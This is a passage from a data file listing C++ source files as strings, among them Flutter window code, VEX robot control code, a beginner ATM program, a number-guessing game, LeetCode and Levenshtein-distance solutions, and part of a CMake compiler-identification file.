flutter_controller_->HandleTopLevelWindowProc(hwnd, message, wparam,\n                                                      lparam);\n    if (result) {\n      return *result;\n    }\n  }\n\n  switch (message) {\n    case WM_FONTCHANGE:\n      flutter_controller_->engine()->ReloadSystemFonts();\n      break;\n  }\n\n  return Win32Window::MessageHandler(hwnd, message, wparam, lparam);\n}\n",
    "#include \"main.h\"\n#include \"rev/rev.hh\"\n#include \"globals.h\"\n#include \"path/Path.h\"\n\nusing namespace rev;\n\nvoid print_position(std::shared_ptr<TwoRotationInertialOdometry> odom) {\n\tpros::lcd::set_text(0, \"X: \" + std::to_string(odom->get_state().pos.x.convert(inch)));\n\tpros::lcd::set_text(1, \"Y: \" + std::to_string(odom->get_state().pos.y.convert(inch)));\n\tpros::lcd::set_text(2, \"Heading: \" + std::to_string(odom->get_state().pos.theta.convert(degree)));\n}\n\n/**\n * A callback function for LLEMU's center button.\n *\n * When this callback is fired, it will toggle line 2 of the LCD text between\n * \"I was pressed!\" and nothing.\n */\nvoid on_center_button() {\n\tstatic bool pressed = false;\n\tpressed = !pressed;\n\tif (pressed) {\n\t\tpros::lcd::set_text(2, \"I was pressed!\");\n\t} else {\n\t\tpros::lcd::clear_line(2);\n\t}\n}\n\n/**\n * Runs initialization code. This occurs as soon as the program is started.\n *\n * All other competition modes are blocked by initialize; it is recommended\n * to keep execution time for this mode under a few seconds.\n */\nvoid initialize() {\n\tpros::lcd::initialize();\n\tpros::lcd::set_text(1, \"Hello PROS User!\");\n\n\tpros::lcd::register_btn1_cb(on_center_button);\n}\n\n/**\n * Runs while the robot is in the disabled state of Field Management System or\n * the VEX Competition Switch, following either autonomous or opcontrol. When\n * the robot is enabled, this task will exit.\n */\nvoid disabled() {}\n\n/**\n * Runs after initialize(), and before autonomous when connected to the Field\n * Management System or the VEX Competition Switch. This is intended for\n * competition-specific initialization routines, such as an autonomous selector\n * on the LCD.\n *\n * This task will exit when the robot is enabled and autonomous or opcontrol\n * starts.\n */\nvoid competition_initialize() {}\n\n/**\n * Runs the user autonomous code. This function will be started in its own task\n * with the default priority and stack size whenever the robot is enabled via\n * the Field Management System or the VEX Competition Switch in the autonomous\n * mode. Alternatively, this function may be called in initialize or opcontrol\n * for non-competition testing purposes.\n *\n * If the robot is disabled or communications is lost, the autonomous task\n * will be stopped. Re-enabling the robot will restart the task, not re-start it\n * from where it left off.\n */\nvoid autonomous() {}\n\n/**\n * Runs the operator control code. This function will be started in its own task\n * with the default priority and stack size whenever the robot is enabled via\n * the Field Management System or the VEX Competition Switch in the operator\n * control mode.\n *\n * If no competition control is connected, this function will run immediately\n * following initialize().\n *\n * If the robot is disabled or communications is lost, the\n * operator control task will be stopped. Re-enabling the robot will restart the\n * task, not resume it from where it left off.\n */\nvoid opcontrol() {\n\tpros::Controller controller(pros::E_CONTROLLER_MASTER);\n\n  \n\tstd::shared_ptr<rev::TwoRotationInertialOdometry> odom =\n  std::make_shared<rev::TwoRotationInertialOdometry>(\n    fwd,      // The forward sensor\n    lat,      // The rightward sensor \n    imu,      // Inertial sensor\n    63.89_mm,  // Diameter of forward wheel\n    63.89_mm,  // Diameter of sideways wheel\n    -1.125_in,  // How far to the right of the center of the robot the forward wheel is\n    -1_in    // How far to the rear of the robot the lateral wheel is from the center\n  );\n  std::shared_ptr<rev::SkidSteerChassis> chassis =\n    std::make_shared<rev::SkidSteerChassis>(left_mg, right_mg);\n  rev::AsyncRunner odom_runner(odom);\n\n  std::shared_ptr<rev::Reckless> reckless =\n  std::make_shared<Reckless>(chassis, odom);\n\tstd::shared_ptr<rev::AsyncRunner> reckless_runner = std::make_shared<rev::AsyncRunner>(reckless);\n\n  std::shared_ptr<rev::CampbellTurn> turn = std::make_shared<CampbellTurn>(chassis, odom, 0.15, 0.05);\n\n  pros::delay(2000);\n  odom->reset_position();\n  \n\n\nPath path;\n\npath.add_straight(Straight({  20_in,  0_in, 0_deg}, 0_s, MOTOR_SPEED::FAST));\npath.add_turn(MyTurn(-90_deg));\npath.add_straight(Straight({ 20_in,   -10_in, 0_deg}, 0_s, MOTOR_SPEED::SLOW));\n\npath.go(reckless, turn);\n\n\n\n  int count = 0;\n  for (int i = 0; i < 50; i++) {\n    print_position(odom);\n    pros::delay(100);\n  }\n\n\n\twhile (true) {\n  print_position(odom);\n\n    int starting = controller.get_analog(pros::E_CONTROLLER_ANALOG_LEFT_Y);\n\n    int turn = controller.get_analog(pros::E_CONTROLLER_ANALOG_RIGHT_X);\n    if (abs(starting) < 25){\n        starting = 0;\n    }\n    if (abs(turn) < 35){\n        turn = 0;\n    }\n\n    if (abs(starting) < 25){\n        starting = 0;\n    }\n    if (abs(turn) < 35){\n        turn = 0;\n    }\n\n\tleft_mg.move_voltage((int)((double) (starting + turn)/150 * 12000));\n\tright_mg.move_voltage((int)((double) (starting - turn)/150 * 12000));\n\n\n\t\tif (controller.get_digital(DIGITAL_L1))\n\t\t\tintake.move_voltage(12000);\n\t\telse if (controller.get_digital(DIGITAL_R1))\n\t\t\tintake",
    "#include <cstddef>\n#include <iostream>\n#include <iomanip>\n#include <limits>\n#include <chrono>\n\n#include \"pi_computation.hpp\"\n#include \"program_options.hpp\"\n\nint main(int argc, char *argv[])\n{\n    auto [desc, vm] = parallel::set_program_options(argc, argv);\n\n    if (vm.count(\"help\"))\n    {\n        std::cout << desc << std::endl;\n        return 0;\n    }\n\n    std::size_t n_iterations;\n    if (vm.count(\"n-iterations\"))\n        n_iterations = vm[\"n-iterations\"].as<std::size_t>();\n    else\n    {\n        std::cout << \"The number of iterations not set. Abort\" << std::endl;\n        return 1;\n    }\n\n    auto start = std::chrono::high_resolution_clock::now();\n\n    auto pi = parallel::compute_pi(n_iterations);\n\n    auto finish = std::chrono::high_resolution_clock::now();\n\n    constexpr auto max_precision = std::numeric_limits<decltype(pi)>::max_digits10;\n    std::cout << std::setprecision(max_precision) << pi << std::endl;\n\n    using ms = std::chrono::milliseconds;\n    auto exec_time = std::chrono::duration_cast<ms>(finish - start).count();\n    std::cout << \"Sequential computing took: \" << exec_time << \" ms\" << std::endl;\n\n    return 0;\n}\n",
    "#include<iostream>\r\nusing namespace std;\r\n\r\nclass bank\r\n{\r\n\tstring address;\r\n\tstring location;\r\n\tint alcnum;\r\n\tint balance;\r\n\tint depo;\r\n\tint ch;\r\n\tpublic :\r\n\t\tbank();\r\n\t\tvoid account()\r\n\t\t{\r\n\t\t\tcout<<\"\\n\\n\\t\\t ATM ACCOUNT DEPOSIT SYSTEM\";\r\n\t\t\tcout<<\"\\n\\n\\t The account holder address is : \";\r\n\t\t\tcin>>address;\r\n\t\t\tcout<<\"\\n\\n\\t The branch location :\";\r\n\t\t\tcin>>location;\r\n\t\t\tcout<<\"\\n\\n\\t Account number :\";\r\n\t\t\tcin>>alcnum;\r\n\t\t\tbalance=200000;\r\n\t\t\tcout<<\"\\n\\n\\t Present available balance : Rs.\"<<balance;\r\n\t\t\tcout<<\"\\n\\n\\t Enter the amount to be deposited Rs :\";\r\n\t\t\tcin>>depo;\r\n\t\t\tcout<<\"\\n\\n\\t Your new available balanced amount is Rs.\"<<balance+depo;\r\n\t\t\tcout<<\"\\n\\n\\t\\t THANK YOU!\";\r\n\t\t\tcout<<\"\\n\\n\\t Press any key to return to the main menu..\";\r\n\t\t\t\r\n\t\t}\r\n\t\tvoid info()\r\n\t\t{\r\n\t\t\tswitch(ch)\r\n\t\t\t{\r\n\t\t\t\tcout<<\"\\n\\n\\t Press 1 and Then Press Enter to Access Your Account Via Pin Number\";\r\n\t\t\t\tcout<<\"\\n\\n\\t or\";\r\n\t\t\t\tcout<<\"\\n\\n\\t Press 0 And Press Enter To Get Help\";\r\n\t\t\t\t\r\n\t\t\t\tcase 0:\r\n\t\t\t\t\tcout<<\"\\n\\n\\t\\t ATM ACCOUNT STATUS\";\r\n\t\t\t\t\tcout<<\"\\n\\n\\t You must have the correct pin number to access this account.See your\";\r\n\t\t\t\t\tcout<<\"\\n\\t bank representation for assistance during bank opening hours\";\r\n\t\t\t\t\tcout<<\"\\n\\t Thanks for,your choice today!!\";\r\n\t\t\t\t\tcout<<\"\\n\\n\\t Press any key to continue.......\";\r\n\t\t\t\t\t\r\n\t\t\t\tcase 1:\r\n\t\t\t\t\tcout<<\"Enter Your Pin Access Number! [Only one attempt is allowed]\";\r\n\t\t\t\t\t\r\n\t\t\t\t\tint pin;\r\n\t\t\t\t\tcout<<\"\\n\\n\\t Pin :\";\r\n\t\t\t\t\tcin>>pin;\r\n\t\t\t\t\tif(pin=12345)\r\n\t\t\t\t\t{\r\n\t\t\t\t\t\tcout<<\"\\n\\n\\t\\t ATM MAIN MENU SCREEN\";\r\n\t\t\t\t\t\tcout<<\"\\n\\n\\t Enter [1] To Deposite Cash\";\r\n\t\t\t\t\t\tcout<<\"\\n\\n\\t Enter [2] To Withdraw Cash\";\r\n\t\t\t\t\t\tcout<<\"\\n\\n\\t Enter [3] To Balance Cash\";\r\n\t\t\t\t\t\tcout<<\"\\n\\n\\t Enter [0] To Exit ATM\";\r\n\t\t\t\t\t\tcout<<\"\\n\\n\\t PLEASE ENTER A SELECTION AND PREE RETURN KEY:\";\r\n\t\t\t\t\t\t\r\n\t\t\t\t\t}\r\n\t\t\t\t\telse \r\n\t\t\t\t\t{\r\n\t\t\t\t\t\tcout<<\"\\n\\n\\t\\t THANK YOU\";\r\n\t\t\t\t\t\tcout<<\"\\n\\n\\t You had made your attempt which failed !! No More attemps allowed!! Sorry!!\";\r\n\t\t\t\t\t\tcout<<\"\\n\\n\\t Press any key to continue.......\";\r\n\t\t\t\t\t\t\r\n\t\t\t\t\t}\r\n\t\t\t}\r\n\t}\r\n};\r\n\t\t\r\n\t\tbank :: bank()\r\n\t\t{\r\n\t\t\tcout<<\"\\n\\n\\t\\t  WELCOME TO ATM\";\r\n\t\t\tcout<<\"\\n\\t............................................. \";\r\n\t\t\tcout<<\"\\n\\n\\t Current date : Mon Aug 22 12 15:00:59 2022\";\r\n\t\t\tcout<<\"\\n\\t............................................. \";\r\n\t\t\tint ch;\r\n\t\t\tswitch(ch)\r\n\t\t\t{\r\n\t\t\t\tcout<<\"\\n\\n\\t Press 1 and Then Press Enter to Access Your Account Via Pin Number\";\r\n\t\t\t\tcout<<\"\\n\\n\\t or\";\r\n\t\t\t\tcout<<\"\\n\\n\\t Press 0 And Press Enter To Get Help\";\r\n\t\t\t\t\r\n\t\t\t\tcase 0:\r\n\t\t\t\t\tcout<<\"\\n\\n\\t\\t ATM ACCOUNT STATUS\";\r\n\t\t\t\t\tcout<<\"\\n\\n\\t You must have the correct pin number to access this account.See your\";\r\n\t\t\t\t\tcout<<\"\\n\\t bank representation for assistance during bank opening hours\";\r\n\t\t\t\t\tcout<<\"\\n\\t Thanks for,your choice today!!\";\r\n\t\t\t\t\tcout<<\"\\n\\n\\t Press any key to continue.......\";\r\n\t\t\t\t\r\n\t\t\t\tcase 1:\r\n\t\t\t\t\tcout<<\"Enter Your Pin Access Number! [Only one attempt is allowed]\";\r\n\t\t\t\t\tbreak;\r\n\t\t\t\t\t\r\n\t\t\t\t\tint pin;\r\n\t\t\t\t\tcout<<\"\\n\\n\\t Pin :\";\r\n\t\t\t\t\tcin>>pin;\r\n\t\t\t\t\tif(int pin=12345)\r\n\t\t\t\t\t{\r\n\t\t\t\t\t\tcout<<\"\\n\\n\\t\\t ATM MAIN MENU SCREEN\";\r\n\t\t\t\t\t\tcout<<\"\\n\\n\\t Enter [1] To Deposite Cash\";\r\n\t\t\t\t\t\tcout<<\"\\n\\n\\t Enter [2] To Withdraw Cash\";\r\n\t\t\t\t\t\tcout<<\"\\n\\n\\t Enter [3] To Balance Cash\";\r\n\t\t\t\t\t\tcout<<\"\\n\\n\\t Enter [0] To Exit ATM\";\r\n\t\t\t\t\t\tcout<<\"\\n\\n\\t PLEASE ENTER A SELECTION AND PREE RETURN KEY:\";\r\n\t\t\t\t\t\t\r\n\t\t\t\t\t}\r\n\t\t\t\t\telse \r\n\t\t\t\t\t{\r\n\t\t\t\t\t\tcout<<\"\\n\\n\\t\\t THANK YOU\";\r\n\t\t\t\t\t\tcout<<\"\\n\\n\\t You had made your attempt which failed !! No More attemps allowed!! Sorry!!\";\r\n\t\t\t\t\t\tcout<<\"\\n\\n\\t Press any key to continue.......\";\r\n\t\t\t\t\t\t\r\n\t\t\t\t\t}\r\n\t\t\t}\r\n\t\t\r\n}\r\nmain()\r\n{\r\n\tbank b;\r\n\tb.info();\r\n\tb.account();\r\n}",
    "/* This source file must have a .cpp extension so that all C++ compilers\n   recognize the extension without flags.  Borland does not know .cxx for\n   example.  */\n#ifndef __cplusplus\n# error \"A C compiler has been selected for C++.\"\n#endif\n\n#if !defined(__has_include)\n/* If the compiler does not have __has_include, pretend the answer is\n   always no.  */\n#  define __has_include(x) 0\n#endif\n\n\n/* Version number components: V=Version, R=Revision, P=Patch\n   Version date components:   YYYY=Year, MM=Month,   DD=Day  */\n\n#if defined(__COMO__)\n# define COMPILER_ID \"Comeau\"\n  /* __COMO_VERSION__ = VRR */\n# define COMPILER_VERSION_MAJOR DEC(__COMO_VERSION__ / 100)\n# define COMPILER_VERSION_MINOR DEC(__COMO_VERSION__ % 100)\n\n#elif defined(__INTEL_COMPILER) || defined(__ICC)\n# define COMPILER_ID \"Intel\"\n# if defined(_MSC_VER)\n#  define SIMULATE_ID \"MSVC\"\n# endif\n# if defined(__GNUC__)\n#  define SIMULATE_ID \"GNU\"\n# endif\n  /* __INTEL_COMPILER = VRP prior to 2021, and then VVVV for 2021 and later,\n     except that a few beta releases use the old format with V=2021.  */\n# if __INTEL_COMPILER < 2021 || __INTEL_COMPILER == 202110 || __INTEL_COMPILER == 202111\n#  define COMPILER_VERSION_MAJOR DEC(__INTEL_COMPILER/100)\n#  define COMPILER_VERSION_MINOR DEC(__INTEL_COMPILER/10 % 10)\n#  if defined(__INTEL_COMPILER_UPDATE)\n#   define COMPILER_VERSION_PATCH DEC(__INTEL_COMPILER_UPDATE)\n#  else\n#   define COMPILER_VERSION_PATCH DEC(__INTEL_COMPILER   % 10)\n#  endif\n# else\n#  define COMPILER_VERSION_MAJOR DEC(__INTEL_COMPILER)\n#  define COMPILER_VERSION_MINOR DEC(__INTEL_COMPILER_UPDATE)\n   /* The third version component from --version is an update index,\n      but no macro is provided for it.  */\n#  define COMPILER_VERSION_PATCH DEC(0)\n# endif\n# if defined(__INTEL_COMPILER_BUILD_DATE)\n   /* __INTEL_COMPILER_BUILD_DATE = YYYYMMDD */\n#  define COMPILER_VERSION_TWEAK DEC(__INTEL_COMPILER_BUILD_DATE)\n# endif\n# if defined(_MSC_VER)\n   /* _MSC_VER = VVRR */\n#  define SIMULATE_VERSION_MAJOR DEC(_MSC_VER / 100)\n#  define SIMULATE_VERSION_MINOR DEC(_MSC_VER % 100)\n# endif\n# if defined(__GNUC__)\n#  define SIMULATE_VERSION_MAJOR DEC(__GNUC__)\n# elif defined(__GNUG__)\n#  define SIMULATE_VERSION_MAJOR DEC(__GNUG__)\n# endif\n# if defined(__GNUC_MINOR__)\n#  define SIMULATE_VERSION_MINOR DEC(__GNUC_MINOR__)\n# endif\n# if defined(__GNUC_PATCHLEVEL__)\n#  define SIMULATE_VERSION_PATCH DEC(__GNUC_PATCHLEVEL__)\n# endif\n\n#elif (defined(__clang__) && defined(__INTEL_CLANG_COMPILER)) || defined(__INTEL_LLVM_COMPILER)\n# define COMPILER_ID \"IntelLLVM\"\n#if defined(_MSC_VER)\n# define SIMULATE_ID \"MSVC\"\n#endif\n#if defined(__GNUC__)\n# define SIMULATE_ID \"GNU\"\n#endif\n/* __INTEL_LLVM_COMPILER = VVVVRP prior to 2021.2.0, VVVVRRPP for 2021.2.0 and\n * later.  Look for 6 digit vs. 8 digit version number to decide encoding.\n * VVVV is no smaller than the current year when a version is released.\n */\n#if __INTEL_LLVM_COMPILER < 1000000L\n# define COMPILER_VERSION_MAJOR DEC(__INTEL_LLVM_COMPILER/100)\n# define COMPILER_VERSION_MINOR DEC(__INTEL_LLVM_COMPILER/10 % 10)\n# define COMPILER_VERSION_PATCH DEC(__INTEL_LLVM_COMPILER    % 10)\n#else\n# define COMPILER_VERSION_MAJOR DEC(__INTEL_LLVM_COMPILER/10000)\n# define COMPILER_VERSION_MINOR DEC(__INTEL_LLVM_COMPILER/100 % 100)\n# define COMPILER_VERSION_PATCH DEC(__INTEL_LLVM_COMPILER     % 100)\n#endif\n#if defined(_MSC_VER)\n  /* _MSC_VER = VVRR */\n# define SIMULATE_VERSION_MAJOR DEC(_MSC_VER / 100)\n# define SIMULATE_VERSION_MINOR DEC(_MSC_VER % 100)\n#endif\n#if defined(__GNUC__)\n# define SIMULATE_VERSION_MAJOR DEC(__GNUC__)\n#elif defined(__GNUG__)\n# define SIMULATE_VERSION_MAJOR DEC(__GNUG__)\n#endif\n#if defined(__GNUC_MINOR__)\n# define SIMULATE_VERSION_MINOR DEC(__GNUC_MINOR__)\n#endif\n#if defined(__GNUC_PATCHLEVEL__)\n# define SIMULATE_VERSION_PATCH DEC(__GNUC_PATCHLEVEL__)\n#endif\n\n#elif defined(__PATHCC__)\n# define COMPILER_ID \"PathScale\"\n# define COMPILER_VERSION_MAJOR DEC(__PATHCC__)\n# define COMPILER_VERSION_MINOR DEC(__PATHCC_MINOR__)\n# if defined(__PATHCC_PATCHLEVEL__)\n#  define COMPILER_VERSION_PATCH DEC(__PATHCC_PATCHLEVEL__)\n# endif\n\n#elif defined(__BORLANDC__) && defined(__CODEGEARC_VERSION__)\n# define COMPILER_ID \"Embarcadero\"\n# define COMPILER_VERSION_MAJOR HEX(__CODEGEARC_VERSION__>>24 & 0x00FF)\n# define COMPILER_VERSION_MINOR HEX(__CODEGEARC_VERSION__>>16 & 0x00FF)\n# define COMPILER_VERSION_PATCH DEC(__CODEGEARC_VERSION__     & 0xFFFF)\n\n#elif defined(__BORLANDC__)\n# define COMPILER_ID \"Borland\"\n  /* __BORLANDC__ = 0xVRR */\n# define COMPILER_VERSION_MAJOR HEX(__BORLANDC__>>8)\n# define COMPILER_VERSION_MINOR HEX(__BORLANDC__ & 0xFF)\n\n#elif defined(__WATCOMC__) && __WATCOMC__ < 1200\n# define COMPILER_ID \"Watcom\"\n   /* __WATCOMC__ = VVRR */\n# define COMPILER_VERSION_MAJOR DEC(__WATCOMC__ / 100)\n# define COMPILER_VERSION_MINOR DEC((__WATCOMC__ / 10) % 10)\n# if (__WATCOMC__ % 10) > 0\n#  define COMPILER_VERSION_PATCH DEC(__WATCOMC__ % 10)\n# endif\n\n#elif defined(__WATCOMC__)\n# define COMPILER_ID \"OpenWatcom\"\n   /* __WATCOMC__ =",
    "#include <iostream> //Incluir biblioteca Input Output Stream\n#include <cstdlib>\n#include <ctime>\nusing namespace std; //\"Abreviar\" a fun\u00e7\u00e3o padr\u00e3o std::\n\n//Fun\u00e7\u00e3o principal, onde o c\u00f3digo ser\u00e1 executado\nint main () {\n    cout << \"***********************\" << endl; //endl = endline\n    cout << \"* Jogo da Adivinha\u00e7\u00e3o *\" << endl;\n    cout << \"***********************\" << endl;\n    //C + Output = cout (<<)\n    //C + Input = cin (>>)\n\n    cout << \"Voc\u00ea gostaria de jogar em qual dificuldade?\" << endl;\n    cout << \"---> (F)F\u00e1cil -- (M)M\u00e9dio -- (D)Dif\u00edcil <---\" << endl;\n\n    char dificuldade;\n    cin >> dificuldade;\n    //char \u00e9 usada para guardar uma letra\n\n    int numero_de_tentativas = 0;\n\n    switch(dificuldade){\n        case 'F':\n            numero_de_tentativas = 15;\n            break;\n        case 'M':\n            numero_de_tentativas = 10;\n            break;\n        case 'D':\n            numero_de_tentativas = 5;\n        default:\n            cout << \"Digite uma dificuldade v\u00e1lida\" << endl;\n    }\n\n    srand(time(NULL));\n\n    const int NUMERO_SECRETO = rand() % 100;\n    \n    bool nao_acertou = true;\n\n    double pontos = 1000.0;\n\n    int tentativas = 0;\n\n    for (tentativas = 1;tentativas <= numero_de_tentativas;tentativas++){\n        // O ++ refere-se a adicionar mais um ( + 1 ) a variavel\n\n        cout << \"Voc\u00ea est\u00e1 na tentativa \" << tentativas << endl;\n\n        int chute;\n\n        cout << \"Qual o seu chute? \" << endl;\n\n        cin >> chute;\n\n        cout << \"O seu chte foi: \" << chute << endl;\n\n        bool acertou = chute == NUMERO_SECRETO;\n        bool maior = chute > NUMERO_SECRETO;\n    \n        double pontos_perdidos = abs(chute - NUMERO_SECRETO)/2.0;\n                                // abs --> abrevia\u00e7\u00e3o para absolute, valor absoluto\n        pontos = pontos - pontos_perdidos;\n\n        if(acertou){\n            cout << \"Voc\u00ea acertou o n\u00famero secreto!\" << endl;\n            nao_acertou = false;\n            break;\n\n        } else if(maior){\n            cout << \"O seu chute foi maior que o n\u00famero secreto!\" << endl;\n        } else{\n            cout << \"O seu chute foi menor que o n\u00famero secreto!\" << endl;\n        }\n    }\n\n    cout << \"Fim de Jogo!\" << endl;\n\n    if(nao_acertou) {\n        cout << \"As suas tentativas acabaram e voc\u00ea perdeu!\" << endl;\n        cout << \"Tente novamente!\" << endl;\n    } else {\n        cout << \"Voc\u00ea ganhou em \" << tentativas << \" tentativas!\" << endl;\n        cout.precision(2); // seta quantas casas decimais\n        cout << fixed; // modificador fixed, para corrigir a nota\u00e7\u00e3o cient\u00edfica\n        cout << \"Sua pontua\u00e7\u00e3o foi de \" << pontos << endl;\n    }\n}\n",
    "// https://leetcode.com/problems/isomorphic-strings/?envType=daily-question&envId=2024-04-02\n\n// [EASY]\n\n// given two strings s and t, determine if they are isomorphic.\n\n// Isomorphic strings: Two string s and t are isomorphic if the characters in s can be replaced to get t\n// Ex: egg and add : True, since e -> a and g -> d\n// foo and bar : False, since f->b, o->a, o->r (inconsistency)\n\n#include <bits/stdc++.h>\nusing namespace std;\n\n\n// transform each string into some number, like each character to index, simultaneously.\n// if there you see the inconsistency, return false, else return true\n\n// TC: O(N)\n// SC: 2 * O(256)\nclass Solution {\npublic:\n    bool isIsomorphic(string s, string t) {\n        // we transform the strings with numbers\n        vector<int> m1(256, 0), m2(256, 0); // ascii characters from 0 to 255\n        int n = s.size();\n        for (int i = 0; i < n; i++) {\n            if (m1[s[i]] != m2[t[i]]) return false;\n            m1[s[i]] = i + 1;\n            m2[t[i]] = i + 1;\n        }\n        return true;\n    }\n};\n\n\n// remember the character conversion, if some inconsistency arises, return false\n// remember to treat each string as primary string (from (string) -> to (string)), to neutralize the fact that s -> t but not t -> s\n\n// TC: 2 * O(N)\n// SC: 2 * O(N)\nclass Solution2 {\nprivate:\n    bool solve(string s, string t, int n) {\n        unordered_map<char, char> mp;\n        for (int i = 0; i < n; i++) {\n            if (mp.find(s[i]) == mp.end()) {\n                mp[s[i]] = t[i];\n            } else {\n                if (mp[s[i]] != t[i]) return false;\n            }\n        }\n        return true;\n    }\npublic:\n    bool isIsomorphic(string s, string t) {\n        int n = s.size();\n        return solve(s, t, n) && solve(t, s, n); // take both string as primary\n    }\n};",
    "#include \"flutter_window.h\"\n\n#include <optional>\n\n#include \"flutter/generated_plugin_registrant.h\"\n\nFlutterWindow::FlutterWindow(const flutter::DartProject& project)\n    : project_(project) {}\n\nFlutterWindow::~FlutterWindow() {}\n\nbool FlutterWindow::OnCreate() {\n  if (!Win32Window::OnCreate()) {\n    return false;\n  }\n\n  RECT frame = GetClientArea();\n\n  // The size here must match the window dimensions to avoid unnecessary surface\n  // creation / destruction in the startup path.\n  flutter_controller_ = std::make_unique<flutter::FlutterViewController>(\n      frame.right - frame.left, frame.bottom - frame.top, project_);\n  // Ensure that basic setup of the controller was successful.\n  if (!flutter_controller_->engine() || !flutter_controller_->view()) {\n    return false;\n  }\n  RegisterPlugins(flutter_controller_->engine());\n  SetChildContent(flutter_controller_->view()->GetNativeWindow());\n\n  flutter_controller_->engine()->SetNextFrameCallback([&]() {\n    this->Show();\n  });\n\n  // Flutter can complete the first frame before the \"show window\" callback is\n  // registered. The following call ensures a frame is pending to ensure the\n  // window is shown. It is a no-op if the first frame hasn't completed yet.\n  flutter_controller_->ForceRedraw();\n\n  return true;\n}\n\nvoid FlutterWindow::OnDestroy() {\n  if (flutter_controller_) {\n    flutter_controller_ = nullptr;\n  }\n\n  Win32Window::OnDestroy();\n}\n\nLRESULT\nFlutterWindow::MessageHandler(HWND hwnd, UINT const message,\n                              WPARAM const wparam,\n                              LPARAM const lparam) noexcept {\n  // Give Flutter, including plugins, an opportunity to handle window messages.\n  if (flutter_controller_) {\n    std::optional<LRESULT> result =\n        flutter_controller_->HandleTopLevelWindowProc(hwnd, message, wparam,\n                                                      lparam);\n    if (result) {\n      return *result;\n    }\n  }\n\n  switch (message) {\n    case WM_FONTCHANGE:\n      flutter_controller_->engine()->ReloadSystemFonts();\n      break;\n  }\n\n  return Win32Window::MessageHandler(hwnd, message, wparam, lparam);\n}\n",
    "#include <SDL.h>\n#include <stdio.h>\n#include \"Controller.h\"\n#include \"Pathfinding.h\"\n//#include \"Game.h\"\n\n\nint Controller::mouseX = 0;\nint Controller::mouseY = 0;\n\n\n//Keeps track if game is running\nbool Controller::quit = false;\n//Event handler\nSDL_Event e;\n\n\n\nvoid Controller::controller()\n{\n\t//Set mouse pos\n\tSDL_GetMouseState(&Controller::mouseX, &Controller::mouseY);\n\t//printf(\"Mouse X: %i Mouse Y: %i\\n\", Controller::mouseX, Controller::mouseY);\n\t//Declare classes\n\tPathfinding pathfinding;\n\t//Handle events on queue\n\tif (SDL_PollEvent(&e) != 0)\n\t{\n\t\t//printf(\"input detected: %i\\n\", e.type);\n\t\t//User requests quit\n\t\tif (e.type == SDL_QUIT)\n\t\t{\n\t\t\tController::quit = true;\n\t\t}\n\n\t\tint buttonCode = 0;\n\n\t\t//MOUSE\n\t\tUint32 mouseState = SDL_GetMouseState(NULL, NULL);\n\t\t//User clicks\n\t\t//printf(\"mouse input: %i \\n\", mouseState);\n\t\tif (e.type == SDL_MOUSEBUTTONDOWN)\n\t\t{\n\n\t\t\t//printf(\"mouse input: %i \\n\", mouseState);\n\t\t\t//LEFT CLICK\n\t\t\tif (mouseState == 1)\n\t\t\t{\n\t\t\t\t//printf(\"Mouse X: %i Mouse Y: %i\\n\", Controller::mouseX, Controller::mouseY);\n\t\t\t\tbuttonCode = 1;\n\n\t\t\t}\n\n\t\t\t//RIGHT CLICK\n\t\t\tif (mouseState == 4)\n\t\t\t{\n\t\t\t\tbuttonCode = 2;\n\n\t\t\t}\n\n\t\t\t//MIDDLE CLICK\n\t\t\tif (mouseState == 2)\n\t\t\t{\n\t\t\t\tbuttonCode = 4;\n\n\t\t\t}\n\t\t}\n\n\t\tif (e.type == SDL_MOUSEMOTION)\n\t\t{\n\t\t\t//LEFT CLICK\n\t\t\tif (mouseState == 1)\n\t\t\t{\n\t\t\t\t//printf(\"Dragged left click\\n\");\n\t\t\t\tbuttonCode = 11;\n\n\t\t\t}\n\n\t\t\t//RIGHT CLICK\n\t\t\tif (mouseState == 4)\n\t\t\t{\n\t\t\t\t//printf(\"Dragged right click\\n\");\n\t\t\t\tbuttonCode = 12;\n\n\t\t\t}\n\n\t\t\t//MIDDLE CLICK\n\t\t\tif (mouseState == 2)\n\t\t\t{\n\t\t\t\t//printf(\"Dragged middle click\\n\");\n\t\t\t\tbuttonCode = 14;\n\n\n\t\t\t}\n\t\t}\n\n\n\t\t//Keyboard\n\t\tif (e.type == 768)\n\t\t{\n\t\t\tbuttonCode = 3;\n\n\t\t}\n\n\t\t// send button code to all places\n\t\tpathfinding.control(buttonCode);\n\n\t}\n}",
    "#include <iostream>\n#include<cassert>\n#include<vector>\n#include<numeric>\n#include<memory>\n\ntemplate<typename T>\ntypename T::size_type LevenshteinDistanceMemory(const T &source,\n                                          const T &target) {\n    if (source.size() > target.size()) {\n        return LevenshteinDistanceMemory(target, source);\n    }\n\n    using TSizeType = typename T::size_type;\n    const std::unique_ptr<TSizeType> min_size(new TSizeType(source.size())), max_size(new TSizeType(target.size()));\n    std::unique_ptr<std::vector<TSizeType>> lev_dist(new std::vector<TSizeType>(*min_size.get() + 1));\n\n    std::iota(lev_dist.get()->begin(), lev_dist.get()->end(), 0);\n\n    for (TSizeType j = 1; j <= *max_size.get(); ++j) {\n        TSizeType previous_diagonal = (*lev_dist.get())[0], previous_diagonal_save;\n        ++(*lev_dist.get())[0];\n\n        for (TSizeType i = 1; i <= *min_size.get(); ++i) {\n            previous_diagonal_save = (*lev_dist.get())[i];\n            if (source[i - 1] == target[j - 1]) {\n                (*lev_dist.get())[i] = previous_diagonal;\n            } else {\n                (*lev_dist.get())[i] = std::min(std::min((*lev_dist.get())[i - 1], (*lev_dist.get())[i]), previous_diagonal) + 1;\n            }\n            previous_diagonal = previous_diagonal_save;\n        }\n    }\n\n    return (*lev_dist.get())[*min_size.get()];\n}\n\nvoid test_func()\n{\n    assert(LevenshteinDistanceMemory<std::string>(\"ARMA\", \"ALKATRAS\") == 6);\n    assert(LevenshteinDistanceMemory<std::string>(\"b\", \"\") == 1);\n    assert(LevenshteinDistanceMemory<std::string>(\"ammmmmmmooooooooogggggggggguuuuuuuuuussssssss\", \"kalahmatkadakldkqwdjqfjsdhjldhfqklfwfhlhfejkwrflwnfhkwejukoikjhefndwzs\") == 66);\n    assert(LevenshteinDistanceMemory<std::string>(\"biba\", \"boba\") == 1);\n    assert(LevenshteinDistanceMemory<std::string>(\"avstria\", \"avstralia\") == 2);\n    assert(LevenshteinDistanceMemory<std::string>(\"kotik\", \"skotina\") == 3);\n    std::cout << \"Tests Success!\\n\";\n}\n\nint main()\n{\n    test_func();\n    return 0;\n}\n",
